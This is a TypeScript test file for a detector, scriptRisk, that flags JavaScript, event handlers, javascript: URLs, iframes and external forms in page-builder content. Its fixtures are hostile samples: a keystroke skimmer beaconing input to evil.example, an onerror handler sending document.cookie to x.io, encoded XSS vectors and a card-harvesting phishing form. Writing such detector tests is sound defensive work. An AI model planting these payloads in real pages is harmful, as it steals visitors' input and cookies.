import { test } from 'node:test';
import assert from 'node:assert/strict';
import { scriptRisk, scriptRiskText, withScript } from '../../src/lib/script-scan';

test('scriptRisk: skimmer in a custom-html block is detected with target addresses', () => {
  const spec = { sections: [{ blocks: [{ type: 'custom-html', html: '<div>Angebot</div>', css: '.scope{color:red}', js: "document.addEventListener('input',e=>navigator.sendBeacon('https://evil.example/c',e.target.value));fetch('//collect.bad-cdn.net/x')" }] }] };
  const r = scriptRisk(spec);
  assert.ok(r); assert.deepEqual(r.kinds, ['js']);
  assert.deepEqual(r.hosts, ['collect.bad-cdn.net', 'evil.example']);
  assert.match(scriptRiskText(r), /enthält JavaScript.*evil\.example/);
});

test('scriptRisk: <script>, event handler, javascript: URL (also encoded), external script, iframe/form', () => {
  const k = (h: string) => scriptRisk({ html: h })?.kinds ?? [];
  assert.deepEqual(k('<p>x</p><script src="https://cdn.track.io/a.js"></script>'), ['script']);
  assert.deepEqual(scriptRisk('<script src="https://cdn.track.io/a.js"></script>')?.hosts, ['cdn.track.io']);
  const img = '<img src="x" onerror="new Image().src=\'https://x.io/?\'+document.cookie">';
  assert.deepEqual(k(img), ['handler']); assert.deepEqual(scriptRisk(img)?.hosts, ['x.io']);
  assert.deepEqual(k('<svg/onload=alert(1)>'), ['handler']);
  assert.deepEqual(k('<a href="javascript:alert(1)">x</a>'), ['url']);
  assert.deepEqual(k('<a href="&#106;avascript&colon;alert(1)">x</a>'), ['url']);
  assert.deepEqual(k('<iframe src="https://fremd.example/form"></iframe>'), ['embed']);
  assert.deepEqual(k('<form action="https://phish.example/p"><input name="cc"></form>'), ['embed']);
  assert.deepEqual(k('<SCRIPT>x()</SCRIPT>'), ['script']);
});

test('scriptRisk: harmless content stays quiet (JSON-LD, CDN images, links, text with "on")', () => {
  for (const h of ['<p>Bonus=gratis, Saison: Sommer</p>', '<a href="https://partner.example/">Partner</a>', '<img src="https://cdn.shop.example/a.jpg" alt="Vase">',
    '<script type="application/ld+json">{"@type":"FAQPage","url":"https://x.example"}</script>', '<div style="background:url(https://cdn.example/b.jpg)">x</div>', '<p>Lesen Sie: Javascript ist toll</p>'])
    assert.equal(scriptRisk({ html: h }), null, h);
  assert.equal(scriptRisk({ js: '  ' }), null);
  assert.deepEqual(withScript({ html: '<p>x</p>' }), {});
  // Load addresses are only reported together with JS, but then completely (image, stylesheet)
  assert.deepEqual(scriptRisk({ html: '<img src="https://pixel.example/p.gif"><link rel="stylesheet" href="//fonts.example/c.css"><script>1</script>' })?.hosts, ['fonts.example', 'pixel.example']);
});
